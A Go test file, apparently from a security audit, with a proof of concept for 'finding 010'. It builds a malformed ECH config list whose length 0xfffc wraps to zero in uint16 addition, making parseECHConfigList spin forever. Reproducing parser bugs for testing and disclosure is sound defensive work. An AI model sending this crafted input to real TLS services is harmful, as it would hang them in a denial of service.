// PoC for finding 010 — parseECHConfigList can loop forever.
//
// The loop in parseECHConfigList advances by `configLen + 4` where the
// addition is computed in uint16. With configLen == 0xfffc the result wraps
// to zero and the slice never shrinks, so the parser spins forever. The test
// runs the parser in a goroutine with a generous timeout and treats a
// timeout as evidence of the bug.

package tls

import (
	"encoding/binary"
	"testing"
	"time"
)

func TestPoC010ECHConfigListInfiniteLoop(t *testing.T) {
	const configBodyLen = 0xfffc
	const configHeaderLen = 4

	totalConfigSection := configHeaderLen + configBodyLen
	if totalConfigSection != 0x10000 {
		t.Fatalf("constructed config section len %d, want 65536", totalConfigSection)
	}

	data := make([]byte, 2+totalConfigSection)

	binary.BigEndian.PutUint16(data[0:2], 0x0000)
	binary.BigEndian.PutUint16(data[2:4], 0x0000)
	binary.BigEndian.PutUint16(data[4:6], configBodyLen)

	done := make(chan struct{})
	go func() {
		defer close(done)
		_, _ = parseECHConfigList(data)
	}()

	select {
	case <-done:
		t.Fatal("expected parser to spin forever on malformed input; it returned")
	case <-time.After(3 * time.Second):
		t.Logf("BUG REPRODUCED: parseECHConfigList did not return within 3s; uint16 overflow at s = s[configLen+4:] keeps slice unchanged")
	}
}
